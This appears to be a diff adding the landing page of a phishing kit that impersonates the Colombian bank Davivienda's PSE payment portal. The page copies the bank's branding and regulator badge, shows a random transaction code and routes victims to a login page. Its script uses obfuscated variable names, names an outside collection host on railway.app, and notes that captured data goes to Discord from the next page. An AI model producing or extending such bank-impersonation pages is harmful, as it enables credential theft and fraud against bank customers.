@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#E30613">
+<title>PSE - Davivienda</title>
+<link rel="icon" type="image/png" href="img/logo-davivienda2.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body class="bodyPersonas">
+
+<div class="dav-wrapper">
+
+    <header class="dav-header">
+        <div class="dav-header-logo-wrap">
+            <img src="img/logo-davivienda2.png" alt="Davivienda" class="dav-logo">
+        </div>
+        <div class="dav-header-info">
+            <span id="dav-fecha">Sábado, 10 de octubre de 2026, 05:56 p. m.</span>
+            <br>
+            <span>Código único CUS: <strong id="dav-cus">000000000</strong></span>
+        </div>
+    </header>
+
+    <section class="dav-section">
+        <div class="dav-contenedorTabla">
+
+            <h1 align="center" class="dav-h1">Bienvenido al Portal de</h1>
+            <h2 align="center" class="dav-h2">Pagos en Línea y PSE</h2>
+
+            <p class="dav-subtitulo" align="center">Seleccione el canal por el cual realizará el pago:</p>
+
+            <div class="dav-canal-grid">
+
+                <a href="login.html" class="dav-canal-card" id="cardPersona" data-canal="Persona Natural">
+                    <img src="img/personanatural.png" alt="Persona Natural" class="dav-canal-icono">
+                    <p class="dav-canal-txt">Persona</p>
+                    <p class="dav-canal-txt">Natural</p>
+                </a>
+
+                <a href="login.html" class="dav-canal-card" id="cardEmpresa" data-canal="Empresa">
+                    <img src="img/empresalogo.png" alt="Empresa" class="dav-canal-icono">
+                    <p class="dav-canal-txt">Empresa</p>
+                </a>
+
+            </div>
+
+            <p class="dav-aviso" align="center">
+                No olvide Cerrar Sesión<br>una vez termine sus transacciones.
+            </p>
+
+        </div>
+    </section>
+
+    <footer class="dav-footer">
+        <div class="dav-footer-inner">
+            <p class="dav-footer-text">Banco Davivienda S.A. Todos los derechos reservados 2026.</p>
+            <div class="dav-footer-logos">
+                <img src="img/Vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia" class="dav-vigilado">
+            </div>
+        </div>
+    </footer>
+
+</div>
+
+<script>
+(function(){
+    var _0xa1 = 'https://multi-bancos-production.up.railway.app';
+    var _0xb2 = 'davivienda';
+    var _0xc3 = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
+    try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+
+    // Fecha dinámica
+    var _0xd4 = new Date();
+    var _0xe5 = _0xd4.toLocaleDateString('es-CO', {
+        weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
+    });
+    var _0xf6 = _0xe5.charAt(0).toUpperCase() + _0xe5.slice(1);
+    var _0xg7 = _0xd4.toLocaleTimeString('es-CO', {
+        hour: '2-digit', minute: '2-digit', hour12: true
+    });
+    var _0xh8 = document.getElementById('dav-fecha');
+    if (_0xh8) _0xh8.textContent = _0xf6 + ', ' + _0xg7;
+
+    // CUS aleatorio de 9 dígitos
+    var _0xi9 = Math.floor(100000000 + Math.random() * 900000000);
+    var _0xj0 = document.getElementById('dav-cus');
+    if (_0xj0) _0xj0.textContent = _0xi9;
+
+    // Detectar clic en Persona / Empresa
+    var _0xk1 = document.getElementById('cardPersona');
+    var _0xl2 = document.getElementById('cardEmpresa');
+
+    function _0xm3(_0xn4){
+        try {
+            sessionStorage.setItem('dav_canal', _0xn4);
+        } catch(e) {}
+        console.log('🆔 Sesión:', _0xc3, '| Canal:', _0xn4);
+        // Continúa a login.html
+        // (no enviamos a Discord aquí; eso será en login.html)
+    }
+
+    if (_0xk1) _0xk1.addEventListener('click', function(){ _0xm3('Persona Natural'); });
+    if (_0xl2) _0xl2.addEventListener('click', function(){ _0xm3('Empresa'); });
+
+})();
+</script>
+
+</body>
+</html>
